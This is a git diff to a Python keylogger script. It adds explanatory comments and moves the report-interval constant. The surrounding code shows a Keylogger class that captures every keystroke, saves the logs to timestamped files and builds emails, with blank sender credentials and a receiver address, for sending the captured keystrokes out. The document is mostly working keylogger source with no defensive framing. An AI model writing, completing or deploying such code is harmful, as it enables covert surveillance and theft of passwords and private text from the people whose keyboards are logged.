@@ -6,22 +6,21 @@ import smtplib
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
-
-SEND_REPORT_EVERY = 60
-
 class Keylogger:
 	def __init__(self, interval, report_method='email'):
+		# developer email credentials i.e the email that is used to send the logs
 		self.EMAIL_ADDRESS = ""
 		self.EMAIL_PASSWORD = ""
+		#The reciever email
 		self.RECIEVER = ""
-
+		  
 		self.interval = interval
 		self.report_method = report_method
 		
 		self.log = ""
 		self.start_dt = datetime.now()
 		self.end_dt = datetime.now()
-	
+	# Function called after key_released 
 	def callback(self, event):
 		name = event.name
 		if len(name) > 1:
@@ -35,14 +34,19 @@ class Keylogger:
 				name = name.replace(" ", "_")
 				name = f"[{name.upper()}]"
 		self.log += name
+	#Dynamic filenaming of log files
+	#If the report method is set to file this function names the log files so their is no name collision
 	def update_filename(self):
 		start_dt_str = str(self.start_dt)[:7].replace(" ", "-").replace(":", "")
 		end_dt_str = str(self.end_dt)[:7].replace(" ", "-").replace(":", "")
 		self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
+	#Writes logs to file provided by update_filename() function
 	def report_to_file(self):
 		with open(f"{self.filename}.keylog", "w") as f:
 			print(self.log, file=f)
 		print(f"[+] saved {self.filename}.keylog")
+	# This function simply writes the email with the log information
+	# Reference smtplib python
 	def prepare_mail(self, message):
 		msg = MIMEMultipart("alternative")
 		msg["From"] = self.EMAIL_ADDRESS
@@ -92,7 +96,8 @@ class Keylogger:
 		print(f"{datetime.now()} - Started keylogger")
 		
 		keyboard.wait()
-
+#Time interval for program to wait before sending key logs to report method
+SEND_REPORT_EVERY = 60
 if __name__ == "__main__":
 	keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
 	keylogger.start()
